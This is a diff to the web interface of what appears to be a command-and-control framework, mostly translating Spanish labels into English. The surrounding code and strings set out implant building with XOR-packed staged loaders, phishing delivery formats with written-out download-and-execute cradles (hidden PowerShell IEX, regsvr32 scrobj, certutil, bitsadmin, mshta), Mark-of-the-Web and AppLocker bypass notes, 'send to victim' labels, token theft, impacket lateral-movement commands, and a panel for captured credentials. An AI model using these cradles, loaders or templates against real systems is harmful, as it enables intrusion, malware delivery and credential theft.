@@ -1393,7 +1393,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
               <!-- Pipeline explainer -->
               <div style="font-size:10px;color:var(--text3);background:var(--bg4);border-radius:4px;padding:7px 10px;line-height:1.6">
                 The server handles everything automatically:<br>
-                <span style="color:var(--text2)">build implant → donut → zlib+XOR → staged en C2 → loader EXE con clave + URL integradas</span><br>
+                <span style="color:var(--text2)">build implant → donut → zlib+XOR → staged in C2 → loader EXE with embedded key + URL</span><br>
                 Distribute <strong style="color:var(--text1)">only the loader (~18KB–9MB)</strong>. The implant downloads at runtime.
               </div>
 
@@ -3326,7 +3326,7 @@ make agent-mtls C2_HOST=10.2.20.200</pre>
         <input id="ps-ports" placeholder="1-1024 o 80,443,8080" value="1-1024">
       </div>
       <div class="form-row">
-        <label>Timeout por puerto (ms)</label>
+        <label>Timeout per port (ms)</label>
         <input id="ps-ms" type="number" value="300" min="50">
       </div>
     </div>
@@ -4607,7 +4607,7 @@ async function runCtxAction(act) {
         const fmtDate = s => { try { return new Date(s).toLocaleDateString(undefined,{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'}); } catch(_){return '';} };
         const payloadItems  = [
             {v:'', l:'🆕 Build new (auto)'},
-            {v:'self', l:'♻️ Reusar binario actual (self) — sin escritura a disco'},
+            {v:'self', l:'♻️ Reuse current binary (self) — no disk write'},
           ]
           .concat(artifacts.map(f=>({v:f.filename, l:`${f.filename}${f.opsec ? ' · OPSEC' : ''}${f.lang ? ` · ${f.lang}` : ''}  (${fmtDate(f.created_at)})`})))
           .concat(uploadFiles.filter(f=>!artifactNames.has(f.filename) && isAgentPayloadFilename(f.filename)).map(f=>({v:f.filename,l:f.filename})));
@@ -10919,7 +10919,7 @@ function getCmdHelp(key, isWin) {
   const extra = CMD_EXTRA_HELP[normalized];
   const usage = extra || (acEntry && (acEntry[1] || acEntry[0]));
   if (usage) {
-    const label = helpLang === 'es' ? 'comando registrado' : 'registered command';
+    const label = 'registered command';
     return `<b>${esc(normalized)}</b> — ${esc(label)}\n\n` +
       `<span class="console-section">USAGE</span>\n  ${esc(usage)}`;
   }
@@ -10956,12 +10956,12 @@ async function bhDownloadBloodHoundZip(agentID, remotePath, label) {
     type: 'DOWNLOAD', args: remotePath,
   });
   if (!queued?.ok || !queued.data?.task_id) {
-    addConsoleOutputForAgent(agentID, '', `No se pudo descargar ${filename}`, null);
+    addConsoleOutputForAgent(agentID, '', `Failed to download ${filename}`, null);
     return false;
   }
   const result = await awaitTaskResult(queued.data.task_id, agentID, 300000);
   if (!result || result.error) {
-    addConsoleOutputForAgent(agentID, '', result?.error || `Timeout descargando ${filename}`, null);
+    addConsoleOutputForAgent(agentID, '', result?.error || `Timeout downloading ${filename}`, null);
     return false;
   }
   let uploaded = false;
@@ -11008,7 +11008,7 @@ async function runDotnetExec(agentID, toolName, toolArgs, label, options = {}) {
   addConsoleOutputForAgent(agentID, `[+] ${lbl} → task #${tid}`, '', null);
   if (tid) {
     if (Number(options.timeoutSec) > 120) {
-      addConsoleOutputForAgent(agentID, `[~] ${lbl} encolado; esperando el resultado del agente…`, '', null);
+      addConsoleOutputForAgent(agentID, `[~] ${lbl} queued; waiting for agent result…`, '', null);
     }
     const pollMs = Number(options.timeoutSec) > 0 ? (Number(options.timeoutSec) + 30) * 1000 : 120000;
     pollResult(tid, agentID, pollMs, {
@@ -11210,7 +11210,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     }
     case 'grep': {
       const gp = rest;
-      if (gp.length < 2) { addConsoleOutput('uso: grep <pattern> <path>', '', null); return; }
+      if (gp.length < 2) { addConsoleOutput('usage: grep<pattern> <path>', '', null); return; }
       taskType = 'GREP';
       taskArgs = JSON.stringify({pattern: gp[0], path: gp.slice(1).join(' '), recursive: true});
       break;
@@ -11218,18 +11218,18 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     case 'mount': taskType='MOUNT'; taskArgs=args.trim(); break;
     case 'chmod': {
       const cp = rest;
-      if (cp.length < 2) { addConsoleOutput('uso: chmod <mode> <path>', '', null); return; }
+      if (cp.length < 2) { addConsoleOutput('usage: chmod <mode> <path>', '', null); return; }
       taskType='CHMOD'; taskArgs=JSON.stringify({mode:cp[0], path:cp.slice(1).join(' ')}); break;
     }
     case 'chown': {
       const op = rest;
-      if (op.length < 2) { addConsoleOutput('uso: chown <owner[:group]> <path>', '', null); return; }
+      if (op.length < 2) { addConsoleOutput('usage: chown <owner[:group]> <path>', '', null); return; }
       const og = op[0].split(':');
       taskType='CHOWN'; taskArgs=JSON.stringify({owner:og[0], group:og[1]||'', path:op.slice(1).join(' ')}); break;
     }
     case 'chtimes': {
       const tp = rest;
-      if (tp.length < 2) { addConsoleOutput('uso: chtimes <RFC3339> <path>', '', null); return; }
+      if (tp.length < 2) { addConsoleOutput('usage: chtimes <RFC3339> <path>', '', null); return; }
       taskType='CHTIMES'; taskArgs=JSON.stringify({mtime:tp[0], path:tp.slice(1).join(' ')}); break;
     }
     case 'env':   taskType='ENV'; break;
@@ -11745,7 +11745,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       const edparts = args.trim().split(/\s+/);
       const edFile  = edparts[0] || '';
       const edArgs  = edparts.slice(1).join(' ');
-      if (!edFile) { addConsoleOutput('uso: dotnet-exec <asm.exe> [args]', '', null); return; }
+      if (!edFile) { addConsoleOutput('usage: dotnet-exec <asm.exe> [args]', '', null); return; }
       addConsoleOutput(`[*] dotnet-exec: cargando ${edFile}…`, '', null);
       try {
         const asmBytes = await fetchSCFile(edFile);
@@ -11887,20 +11887,20 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       const [sub,...rest2] = args.split(' ');
       if (sub==='steal') { taskType='TOKEN_STORE_STEAL'; taskArgs=JSON.stringify({pid:parseInt(rest2[0],10)||0}); }
       else if (sub==='use') {
-        if (!rest2[0]) { addConsoleOutput('uso: token-store use <id>', '', null); return; }
+        if (!rest2[0]) { addConsoleOutput('usage: token-store use <id>', '', null); return; }
         taskType='TOKEN_STORE_USE'; taskArgs=JSON.stringify({id:parseInt(rest2[0],10)||1});
       }
       else if (sub==='show' || sub==='list') { taskType='TOKEN_STORE_SHOW'; }
       else if (sub==='remove') { taskType='TOKEN_STORE_REMOVE'; taskArgs=JSON.stringify({id:parseInt(rest2[0],10)||1}); }
       else if (sub==='clear') { taskType='TOKEN_STORE_CLEAR'; }
-      else { addConsoleOutput('uso: token-store steal|use|show|remove|clear ...', '', null); return; }
+      else { addConsoleOutput('usage: token-store steal|use|show|remove|clear ...', '', null); return; }
       break;
     }
     case 'screenwatch': {
       const [sw,...sr] = args.split(' ');
       if (sw==='start') { taskType='SCREENWATCH_START'; taskArgs=sr[0]||'30'; }
       else if (sw==='stop') { taskType='SCREENWATCH_STOP'; }
-      else { addConsoleOutput('uso: screenwatch start [secs] | stop', '', null); return; }
+      else { addConsoleOutput('usage: screenwatch start [secs] | stop', '', null); return; }
       break;
     }
     case 'bof-store': {
@@ -11917,7 +11917,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
           taskType = 'BOF_STORE_LOAD'; taskArgs = bofName;
         } catch(e) { addConsoleOutput('', e.message, null); return; }
       }
-      else { addConsoleOutput('uso: bof-store load|list|unload ...', '', null); return; }
+      else { addConsoleOutput('usage: bof-store load|list|unload ...', '', null); return; }
       break;
     }
 
@@ -12477,17 +12477,17 @@ function dlvSetLang(lang) {
 }
 
 const _dlvFmtHints = {
-  lnk:      'El LNK ejecuta powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString(&lt;StageURL&gt;) — descarga y ejecuta el agente en memoria.',
-  iso:      'ISO montable que contiene el LNK. Evita MOTW (Mark-of-the-Web) porque el volumen montado no hereda la zona de Internet.',
-  hta:      'HTA = HTML Application. Lo ejecuta mshta.exe (trusted binary). PS cradle en el onload del VBScript.',
-  bat:      'BAT minimalista que llama a PowerShell con un cradle codificado en base64.',
+  lnk:      'The LNK runs powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString(&lt;StageURL&gt;) — downloads and executes the agent in memory.',
+  iso:      'Mountable ISO containing the LNK. Bypasses MOTW (Mark-of-the-Web) because the mounted volume does not inherit the Internet zone.',
+  hta:      'HTA = HTML Application. Executed by mshta.exe (trusted binary). PS cradle in the VBScript onload handler.',
+  bat:      'Minimal BAT that calls PowerShell with a base64-encoded cradle.',
   ps1:      'Pure PowerShell script. IEX + DownloadString or DownloadData + shellcode injection via reflective CreateThread.',
-  jscript:  'JScript (.js) lanzado con wscript.exe. Usa ActiveXObject(\"WScript.Shell\") para PS cradle.',
-  vbscript: 'VBScript (.vbs) con CreateObject(\"WScript.Shell\"). Compatible con cualquier Windows moderno.',
-  sct:      'Scriptlet COM (.sct). Se registra y ejecuta via: regsvr32 /s /n /u /i:&lt;URL&gt; scrobj.dll',
-  html:     'EXE del agente embebido en base64 dentro del HTML. Al abrir, JS hace auto-download. No necesita Stage URL — el agente va dentro del archivo.',
+  jscript:  'JScript (.js) launched with wscript.exe. Uses ActiveXObject(\"WScript.Shell\") for PS cradle.',
+  vbscript: 'VBScript (.vbs) with CreateObject(\"WScript.Shell\"). Compatible with any modern Windows.',
+  sct:      'COM Scriptlet (.sct). Registers and runs via: regsvr32 /s /n /u /i:&lt;URL&gt; scrobj.dll',
+  html:     'Agent EXE embedded as base64 inside the HTML. On open, JS auto-downloads it. No Stage URL needed — agent is inside the file.',
   docm:     'Word macro-enabled document (.docm). AutoOpen + Document_Open run a PS cradle via WScript.Shell. Requires the victim to enable macros.',
-  lolbin:   'Genera 6 .bat independientes (certutil, bitsadmin, msiexec, regsvr32, mshta, wmic) que descargan y ejecutan el agente desde la Staging URL. Sin PowerShell.',
+  lolbin:   'Generates 6 standalone .bat files (certutil, bitsadmin, msiexec, regsvr32, mshta, wmic) that download and execute the agent from the Staging URL. No PowerShell.',
 };
 
 function setDeliveryFmt(fmt) {
@@ -12557,11 +12557,11 @@ async function dlvLaunchTunnel(provider) {
   // Auto-start the staging server if not running (required before any tunnel)
   await refreshStager();
   if (!stagerState?.running) {
-    setStatus('Arrancando staging server…', 'var(--yellow)');
+    setStatus('Starting staging server…', 'var(--yellow)');
     const port = stagerState?.port || 7777;
     const sr = await api('POST', '/api/stager/start', {port});
     if (!sr?.ok) {
-      setStatus('✗ No se pudo arrancar el staging server: ' + (sr?.error || '?'), 'var(--red)');
+      setStatus('✗ Failed to start staging server: ' + (sr?.error || '?'), 'var(--red)');
       return;
     }
     await refreshStager();
@@ -12572,9 +12572,9 @@ async function dlvLaunchTunnel(provider) {
     localtunnel: 'LocalTunnel via npx…',
     serveo: 'Serveo via SSH…',
     bore: 'bore.pub…',
-    manual: 'Configurando URL manual…',
+    manual: 'Configuring manual URL…',
   };
-  setStatus(providerLabels[provider] || ('Iniciando ' + provider + '…'), 'var(--yellow)');
+  setStatus(providerLabels[provider] || ('Starting ' + provider + '…'), 'var(--yellow)');
 
   const r = await api('POST', '/api/stager/tunnel/start', body);
   if (r?.ok && r.data?.url) {
@@ -12583,7 +12583,7 @@ async function dlvLaunchTunnel(provider) {
     const el = document.getElementById('dlv-stageurl2');
     if (el) el.value = url;
     dlvUpdateTunnelBanner();
-    setStatus('✓ Activo: ' + url, 'var(--green)');
+    setStatus('✓ Active: ' + url, 'var(--green)');
     refreshStager();
   } else {
     const err = r?.error || 'Error starting tunnel';
@@ -12591,8 +12591,8 @@ async function dlvLaunchTunnel(provider) {
     if (err.includes('installed') || err.includes('not found') || err.includes('executable')) {
       const installs = {
         cloudflared: '→ Will try to download automatically. Retry.',
-        localtunnel: '→ Instala Node.js: sudo apt install nodejs npm',
-        bore: '→ Instala: cargo install bore-cli  o  go install github.com/ekzhang/bore@latest',
+        localtunnel: '→ Install Node.js: sudo apt install nodejs npm',
+        bore: '→ Install: cargo install bore-cli  or  go install github.com/ekzhang/bore@latest',
         serveo: '→ Verify SSH is available: which ssh',
       };
       hint = installs[provider] || '';
@@ -12660,7 +12660,7 @@ async function unifiedBuild() {
     } else {
       res.innerHTML = '';
       renderBuildResult(res, r.data || {});
-      toast('Build completado', 'green');
+      toast('Build complete', 'green');
     }
 
   } else if (_payMode === 'stager') {
@@ -12735,11 +12735,11 @@ function renderUnifiedResult(resEl, r) {
   }
 
   // Collapsible raw JSON
-  html += `<details style="margin-top:4px"><summary style="font-size:10px;color:var(--text3);cursor:pointer">Ver todos los artefactos</summary>`;
+  html += `<details style="margin-top:4px"><summary style="font-size:10px;color:var(--text3);cursor:pointer">View all artifacts</summary>`;
   html += `<div class="result-card">${esc(JSON.stringify(d, null, 2))}</div></details>`;
   resEl.innerHTML = html;
   refreshPayloadStore();
-  toast('Build completado', 'green');
+  toast('Build complete', 'green');
 }
 
 function togglePill(id) {
@@ -12849,7 +12849,7 @@ function ldrFillURL() {
     const host = h.replace(/^https?:\/\//i, '').replace(/\/+$/, '');
     if (el) { el.value = `${scheme}://${host}:${port}`; ldrUpdatePreview(); }
   } else {
-    toast('No hay tunnel activo ni host configurado', 'red');
+    toast('No active tunnel or host configured', 'red');
   }
 }
 
@@ -12906,13 +12906,13 @@ async function buildLoader() {
     const compKB     = d.compressed_kb || rawKB;
     const stageEndpt = d.bin_stage || '';
     const dlURL      = loaderFile ? `${BASE}/api/artifacts/${encodeURIComponent(loaderFile)}?token=${encodeURIComponent(TOKEN)}` : '';
-    const sizeLabel  = d.compressed_kb ? `${esc(rawKB)} KB raw → <b>${esc(compKB)} KB</b> comprimido+XOR` : `${esc(rawKB)} KB (XOR encrypted)`;
+    const sizeLabel  = d.compressed_kb ? `${esc(rawKB)} KB raw → <b>${esc(compKB)} KB</b> compressed+XOR` : `${esc(rawKB)} KB (XOR encrypted)`;
     res.innerHTML = `
       <div class="result-card" style="border-color:var(--green)">
         <div style="color:var(--green);font-weight:700;margin-bottom:8px">✓ Loader listo</div>
         <div style="font-size:11px;display:flex;flex-direction:column;gap:4px">
           <div><span style="color:var(--text3)">Loader:</span> <code>${esc(loaderFile)}</code></div>
-          <div><span style="color:var(--text3)">Implant stageado:</span> agent_${esc(transport)}_${esc(lang)}.exe</div>
+          <div><span style="color:var(--text3)">Staged implant:</span> agent_${esc(transport)}_${esc(lang)}.exe</div>
           <div><span style="color:var(--text3)">Size:</span> ${sizeLabel}</div>
           <div style="word-break:break-all"><span style="color:var(--text3)">Stage URL:</span> <code style="font-size:10px">${esc(stageEndpt)}</code></div>
           ${maxdl > 0 ? `<div style="color:var(--yellow)">⚠ Stage expira tras ${maxdl} descarga${maxdl>1?'s':''}</div>` : ''}
@@ -12998,18 +12998,18 @@ async function payEnsureTunnel() {
     return;
   }
   // Auto-start localtunnel
-  stageEl.placeholder = 'Iniciando localtunnel…';
+  stageEl.placeholder = 'Starting localtunnel…';
   stageEl.disabled = true;
-  toast('Iniciando localtunnel…');
+  toast('Starting localtunnel…');
   try {
     const r = await api('POST', '/api/stager/tunnel/start', { provider: 'localtunnel', port: 8080 });
     if (r?.ok && r.data?.url) {
       stageEl.value = r.data.url;
       stagerState = Object.assign(stagerState || {}, { public_url: r.data.url, tunnel_active: true });
-      toast('Tunnel activo: ' + r.data.url);
+      toast('Tunnel active: ' + r.data.url);
       refreshStager();
     } else {
-      toast(r?.error || 'No se pudo arrancar localtunnel', 'error');
+      toast(r?.error || 'Failed to start localtunnel', 'error');
       stageEl.placeholder = 'https://xxx.loca.lt';
     }
   } catch(e) {
@@ -13114,7 +13114,7 @@ function pslFillFromTunnel() {
   if (!url) { toast('No active tunnel — start one in the Stager tab', 'error'); return; }
   document.getElementById('psl-payload-url').value  = url + '/agent.bin';
   document.getElementById('psl-script-host').value  = url;
-  toast('URLs rellenadas desde tunnel activo');
+  toast('URLs filled from active tunnel');
 }
 
 function pslGenerate() {
@@ -13202,16 +13202,16 @@ async function loadC2PubIP() {
 
 const DLV_NOTES = {
   html:      'The EXE is embedded in the HTML. The victim downloads it on page open.',
-  lnk:       'Shortcut que lanza PowerShell oculto. Icono de documento shell32.dll.',
+  lnk:       'Shortcut that launches hidden PowerShell. Shell32.dll document icon.',
   iso:       'ISO with the LNK inside. Windows mounts it automatically on double-click.',
   zip:       'ZIP with the LNK inside. Useful when ISO is blocked by email.',
   hta:       'HTA application run by mshta.exe. Bypasses AppLocker in default configurations.',
-  ps1:       'Script PS1 puro. Útil para paste-and-run o macro que llama a IEX.',
-  bat:       'Batch file que lanza PS codificado. Compatible con todas las versiones de Windows.',
-  jscript:   'JScript (.js) ejecutado por wscript.exe. Sin dependencia de PowerShell visible.',
-  vbscript:  'VBScript (.vbs) ejecutado por wscript.exe.',
-  sct:       'Scriptlet para regsvr32 Squiblydoo: regsvr32 /s /n /u /i:<url> scrobj.dll',
-  wsf:       'Windows Script File — combina JScript/VBScript, ejecutado por wscript.exe.',
+  ps1:       'Pure PS1 script. Useful for paste-and-run or a macro that calls IEX.',
+  bat:       'Batch file that launches encoded PowerShell. Compatible with all Windows versions.',
+  jscript:   'JScript (.js) run by wscript.exe. No visible PowerShell dependency.',
+  vbscript:  'VBScript (.vbs) run by wscript.exe.',
+  sct:       'Scriptlet for regsvr32 Squiblydoo: regsvr32 /s /n /u /i:<url> scrobj.dll',
+  wsf:       'Windows Script File — combines JScript/VBScript, run by wscript.exe.',
 };
 
 function dlvFillStageURL() {
@@ -13220,7 +13220,7 @@ function dlvFillStageURL() {
     document.getElementById('dlv-stageurl').value = url;
     toast('Stage URL: ' + url);
   } else {
-    toast('No hay tunnel activo — inicia uno en la tab Stager', 'warn');
+    toast('No active tunnel — start one in the Stager tab', 'warn');
   }
 }
 
@@ -13457,9 +13457,9 @@ async function cleanPayloads(dir) {
         if (!r?.ok) throw new Error(r?.error || 'No se pudieron cargar los payloads');
         for (const file of (Array.isArray(r.data) ? r.data : [])) {
           const deleted = await api('DELETE', '/api/artifacts/' + encodeURIComponent(file.filename));
-          if (!deleted?.ok) throw new Error(deleted?.error || `No se pudo eliminar ${file.filename}`);
+          if (!deleted?.ok) throw new Error(deleted?.error || `Failed to delete ${file.filename}`);
         }
-        toast(`${label} limpiados`, 'green');
+        toast(`${label} cleared`, 'green');
         await refreshPayloadStore();
         dlvRefreshArtifacts(); ipcLoadArtifacts(); ipcRefreshStageURLs();
         return;
@@ -13470,7 +13470,7 @@ async function cleanPayloads(dir) {
         body: JSON.stringify({ cmd: `rm -f payloads/* && echo "OK payloads"` .replace('payloads', dir) }),
       });
       const text = await resp.text();
-      toast(`${label} limpiados`, 'green');
+      toast(`${label} cleared`, 'green');
       ipcLoadArtifacts(); ipcRefreshStageURLs(); // refresh payload selector + stage URLs
     } catch(e) { toast('Error: ' + e.message, 'error'); }
   });
@@ -13532,7 +13532,7 @@ async function buildPayload() {
   if (!host && c2IPs?.length) {
     host = c2IPs[0];
     document.getElementById('pay-host').value = host;
-    toast(`Host auto-rellenado: ${host}`, 'green');
+    toast(`Host auto-filled: ${host}`, 'green');
   }
 
   // Build server URL from host+port+transport
@@ -13727,16 +13727,16 @@ function renderBuildResult(container, data) {
     bat:'Batch file — send to victim',
     js:'JScript dropper — send to victim',
     vbs:'VBScript dropper — send to victim',
-    sct:'Scriptlet SCT — alojar en servidor, invocar con regsvr32',
+    sct:'Scriptlet SCT — host on server, invoke with regsvr32',
     wsf:'Windows Script File — send to victim',
     docm:'Word DOCM — send to victim (requires Enable Macros)',
-    bin_stage:'Stage URL — ya activa en el C2 (no subir manualmente)',
-    runner_stage:'Stage URL runner DLL — ya activa en el C2',
+    bin_stage:'Stage URL — already active on C2 (no manual upload needed)',
+    runner_stage:'Stage URL runner DLL — already active on C2',
     ps1_stage:'Stage URL loader PS1 — already active on C2 (LNK downloads it automatically)',
-    exe_stage:'Stage URL EXE — LOLBin la descarga directamente',
-    certutil:'LOLBin BAT — certutil -urlcache -split -f … (descarga+exec sin PS)',
-    bitsadmin:'LOLBin BAT — bitsadmin /transfer … (descarga+exec sin PS)',
-    msiexec:'LOLBin BAT — msiexec /q /i <URL> (instala MSI remoto)',
+    exe_stage:'Stage URL EXE — LOLBin downloads it directly',
+    certutil:'LOLBin BAT — certutil -urlcache -split -f … (download+exec no PS)',
+    bitsadmin:'LOLBin BAT — bitsadmin /transfer … (download+exec no PS)',
+    msiexec:'LOLBin BAT — msiexec /q /i <URL> (install remote MSI)',
     regsvr32:'LOLBin BAT — regsvr32 /s /n /u /i:<URL> scrobj.dll',
     mshta:'LOLBin BAT — mshta.exe <URL>',
     wmic:'LOLBin BAT — wmic os get /format:<URL>',
@@ -13785,14 +13785,14 @@ async function payStageFile(serverPath, filename) {
     const r = await api('POST', '/api/stager/files/local', {path: serverPath, one_shot: oneShot});
     if (r?.ok) {
       const url = r.data?.url;
-      if (url) { copyText(url); toast((oneShot?'One-shot':'Permanente')+' staged, URL copiada: '+filename); }
+      if (url) { copyText(url); toast((oneShot?'One-shot':'Permanent')+' staged, URL copied: '+filename); }
       else toast('Staged: '+filename);
       showTab('stager');
     } else toast(r?.error || 'Stage failed', 'error');
   };
   showChoice('Stage File', `"${filename}" — How do you want to serve it?\n\nOne-Shot: the file is deleted after the first download.\nPermanent: available indefinitely.`, [
     {label:'One-Shot',   variant:'primary', onClick: () => doStage(true)},
-    {label:'Permanente', variant:'ghost',   onClick: () => doStage(false)},
+    {label:'Permanent', variant:'ghost',   onClick: () => doStage(false)},
   ]);
 }
 
@@ -14602,7 +14602,7 @@ function tlExpand(idx) {
   document.getElementById('tl-exp-host').textContent    = e.Hostname ? `${e.Hostname} / ${e.Username||''}` : '';
   document.getElementById('tl-exp-time').textContent    = e.QueuedAt ? new Date(e.QueuedAt).toLocaleString() : '';
   document.getElementById('tl-exp-args').textContent    = e.Args   || '(empty)';
-  document.getElementById('tl-exp-output').textContent  = e.Output || '(sin output)';
+  document.getElementById('tl-exp-output').textContent  = e.Output || '(no output)';
   document.getElementById('tl-exp-error').textContent   = e.Error  || '';
   document.getElementById('tl-exp-error-row').style.display = e.Error ? '' : 'none';
   openModal('modal-tl-expand');
@@ -17667,10 +17667,10 @@ function opShowWelcome() {
   if (opWelcomeDone) return;
   opWelcomeDone = true;
   const lines = [
-    ['var(--accent)',  '⚡ Operator Terminal — herramientas locales en Kali'],
+    ['var(--accent)',  '⚡ Operator Terminal — local tools on Kali'],
     ['var(--text3)',   'Commands run on this machine (Kali), not on the agent.'],
     ['var(--text3)',   ''],
-    ['var(--text2)',   'Ejemplos:'],
+    ['var(--text2)',   'Examples:'],
     ['var(--text)',    '  certipy-ad find -u localuser@cs.org -p pass -dc-ip 10.2.20.100 -vulnerable'],
     ['var(--text)',    '  bloodhound-python -u user -p pass -d cs.org -ns 10.2.20.100 -dc WIN2022-SRV-X64.cs.org -c All --zip'],
     ['var(--text)',    '  nxc smb 10.2.20.0/24 -u user -p pass'],
@@ -17684,10 +17684,10 @@ function opShowWelcome() {
     ['var(--text3)',   '! prefijo = forzar shell sin modificar   Ctrl+C = interrumpir'],
     ['var(--text3)',   ''],
     ['var(--text2)',   'Variables (persist between commands):'],
-    ['var(--text)',    '  TARGET=10.10.10.10          # definir variable'],
-    ['var(--text)',    '  nxc ldap $TARGET -u \'\' -p \'\'  # usar variable'],
-    ['var(--text)',    '  vars                         # listar variables'],
-    ['var(--text)',    '  unset TARGET                 # eliminar variable'],
+    ['var(--text)',    '  TARGET=10.10.10.10          # set variable'],
+    ['var(--text)',    '  nxc ldap $TARGET -u \'\' -p \'\'  # use variable'],
+    ['var(--text)',    '  vars                         # list variables'],
+    ['var(--text)',    '  unset TARGET                 # delete variable'],
   ];
   const out = document.getElementById('op-output');
   for (const [color, text] of lines) {
@@ -17984,7 +17984,7 @@ async function aiRunRecos(force) {
   body.style.display = '';
   const chevEl = document.getElementById('ai-recos-chev');
   if (chevEl) chevEl.textContent = '▼';
-  body.innerHTML = '<div style="padding:10px 14px;font-size:11px;color:var(--text3)"><span class="ai-cursor"></span> Analizando estado del C2…</div>';
+  body.innerHTML = '<div style="padding:10px 14px;font-size:11px;color:var(--text3)"><span class="ai-cursor"></span> Analyzing C2 state…</div>';
   if (tsEl) tsEl.textContent = '';
 
   let c2ctx = '';
@@ -18068,26 +18068,26 @@ function aiRecoAsk(idx) {
 
 async function aiInjectContext() {
   // Build a context snapshot of the current C2 state
-  let ctx = '## Estado actual del C2\n\n';
+  let ctx = '## Current C2 state\n\n';
 
   // Agents
   const now = c2NowMs();
   const active = (agents || []).filter(a => (now - new Date(a.last_seen)) < 10 * 60 * 1000);
   const stale  = (agents || []).filter(a => (now - new Date(a.last_seen)) >= 10 * 60 * 1000);
-  ctx += `**Agentes activos (${active.length}):**\n`;
+  ctx += `**Active agents (${active.length}):**\n`;
   for (const a of active) {
     const ago = Math.round((now - new Date(a.last_seen)) / 1000);
     ctx += `- \`${a.username}@${a.hostname}\` — ${a.os} · IP ${a.ip} · PID ${a.pid} · sleep ${a.sleep_sec}s · last beacon ${ago}s ago\n`;
   }
   if (stale.length) {
-    ctx += `\n**Agentes inactivos (${stale.length}):** ${stale.map(a => a.hostname).join(', ')}\n`;
+    ctx += `\n**Inactive agents (${stale.length}):** ${stale.map(a => a.hostname).join(', ')}\n`;
   }
 
   // Credentials (if API available)
   try {
     const cr = await api('GET', '/api/creds');
     if (cr?.ok && cr.data?.length) {
-      ctx += `\n**Credenciales capturadas (${cr.data.length}):**\n`;
+      ctx += `\n**Captured credentials (${cr.data.length}):**\n`;
       for (const c of cr.data.slice(0, 10)) {
         ctx += `- ${c.domain ? c.domain+'\\' : ''}${c.username}` +
           (c.password ? ` : ${c.password}` : '') +
@@ -18714,7 +18714,7 @@ async function aicSend() {
     toast('Configure the Anthropic API key in the 🤖 AI tab (saved in localStorage)', 'error'); return;
   }
   if (cfg.provider === 'ollama' && !cfg.model) {
-    toast('Escribe el nombre del modelo Ollama en la barra del AI Console', 'error'); return;
+    toast('Enter the Ollama model name in the AI Console bar', 'error'); return;
   }
 
   input.value = ''; input.style.height = '';
@@ -19079,7 +19079,7 @@ function clearProfile() {
   document.getElementById('pay-ua').value = '';
   document.getElementById('pay-uris').value = '';
   document.getElementById('pay-headers').value = '';
-  toast('Perfil limpiado', 'blue');
+  toast('Profile cleared', 'blue');
 }
 
 async function deleteProfile(name) {
@@ -19610,48 +19610,48 @@ function ipcUpdate() {
 
   const cradles = {
     'smb-upload':
-`# Subir binario al share C$ del target
+`# Upload binary to target C$ share
 impacket-smbclient ${impAuth} \\
   -c 'use C$; put ${lbin} ${rUnc}'`,
 
     'smb-wmi':
-`# 1. Subir via SMB
+`# 1. Upload via SMB
 impacket-smbclient ${impAuth} \\
   -c 'use C$; put ${lbin} ${rUnc}'
 
-# 2. Ejecutar via WMIexec
+# 2. Execute via WMIexec
 impacket-wmiexec ${impAuth} '${rpath}'`,
 
     'smb-atexec':
-`# 1. Subir via SMB
+`# 1. Upload via SMB
 impacket-smbclient ${impAuth} \\
   -c 'use C$; put ${lbin} ${rUnc}'
 
-# 2. Ejecutar via Scheduled Task
+# 2. Execute via Scheduled Task
 impacket-atexec ${impAuth} '${rpath}'`,
 
     'smb-dcom':
-`# 1. Subir via SMB
+`# 1. Upload via SMB
 impacket-smbclient ${impAuth} \\
   -c 'use C$; put ${lbin} ${rUnc}'
 
-# 2. Ejecutar via DCOM (MMC20.Application)
+# 2. Execute via DCOM (MMC20.Application)
 impacket-dcomexec ${impAuth} '${rpath}'`,
 
     'psexec':
-`# PSexec gestiona la subida internamente (ADMIN$)
+`# PSexec handles the upload internally (ADMIN$)
 impacket-psexec ${impAuth} cmd.exe`,
 
     'smbexec':
-`# Shell remota via SMB (sin subir binario propio)
+`# Remote shell via SMB (no binary upload needed)
 impacket-smbexec ${impAuth}`,
 
     'nxe-upload':
-`# 1. Subir binario
+`# 1. Upload binary
 netexec smb ${target} ${nxeAuth} \\
   --put-file ${lbin} '${rpath}'
 
-# 2. Ejecutar
+# 2. Execute
 netexec smb ${target} ${nxeAuth} \\
   -x '${rpath}'`,
 
@@ -19741,7 +19741,7 @@ async function ipcRun(action) {
       // be stored on the teamserver. Materialise a local temporary copy.
       localPayload = await ipcStageLocalPayload(lbinFile);
     } catch (e) {
-      toast(`No se pudo preparar el payload local: ${e.message}`, 'error');
+      toast(`Failed to prepare local payload: ${e.message}`, 'error');
       return;
     }
   }
@@ -20276,7 +20276,7 @@ async function ibuildAndDeploy() {
     }
     ipcUpdate();
 
-    outEl.innerHTML += '<span style="color:var(--text3)">[ iniciando upload+exec... ]\n</span>';
+    outEl.innerHTML += '<span style="color:var(--text3)">[ starting upload+exec... ]\n</span>';
     outEl.scrollTop = outEl.scrollHeight;
 
     // Auto-execute upload-exec
@@ -21390,7 +21390,7 @@ document.addEventListener('DOMContentLoaded', () => {
       <input id="sudo-pass-input" type="password" placeholder="Sudo password…" autocomplete="current-password" style="width:100%">
       <div style="display:flex;gap:8px;justify-content:flex-end">
         <button class="btn btn-ghost" onclick="closeModal('modal-sudo')">Cancel</button>
-        <button class="btn btn-primary" onclick="sudoConfirm()">Ejecutar</button>
+        <button class="btn btn-primary" onclick="sudoConfirm()">Run</button>
       </div>
     </div>
   </div>
